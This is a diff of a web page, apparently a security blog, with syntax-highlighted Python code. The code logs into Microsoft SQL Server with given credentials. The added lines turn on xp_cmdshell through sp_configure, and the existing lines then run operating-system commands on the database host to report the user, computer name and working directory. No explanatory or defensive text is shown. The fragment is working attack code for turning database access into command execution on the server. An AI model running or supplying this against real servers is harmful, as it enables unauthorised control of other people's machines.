@@ -371,7 +371,10 @@ if (language) {
     <span class="k">try</span><span class="p">:</span>
         <span class="n">mssql</span> <span class="o">=</span> <span class="n">_mssql</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">server</span><span class="o">=</span><span class="n">MSSQL_SERVER</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">MSSQL_USERNAME</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">MSSQL_PASSWORD</span><span class="p">)</span>
         <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Successful login: &#34;</span><span class="o">+</span><span class="n">MSSQL_USERNAME</span><span class="o">+</span><span class="s2">&#34;@&#34;</span><span class="o">+</span><span class="n">MSSQL_SERVER</span><span class="p">)</span>
-
+        
+        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Trying to enable xp_cmdshell ...&#34;</span><span class="p">)</span>
+        <span class="n">mssql</span><span class="o">.</span><span class="n">execute_query</span><span class="p">(</span><span class="s2">&#34;EXEC sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;exec SP_CONFIGURE &#39;xp_cmdshell&#39;,1;RECONFIGURE&#34;</span><span class="p">)</span>
+        
         <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;echo </span><span class="si">%u</span><span class="s1">sername%^|%COMPUTERNAME% &amp; cd&#39;</span>
         <span class="n">mssql</span><span class="o">.</span><span class="n">execute_query</span><span class="p">(</span><span class="s2">&#34;EXEC xp_cmdshell &#39;&#34;</span><span class="o">+</span><span class="n">cmd</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
         <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">computername</span><span class="p">,</span> <span class="n">cwd</span><span class="p">)</span> <span class="o">=</span> <span class="n">process_result</span><span class="p">(</span><span class="n">mssql</span><span class="p">)</span>
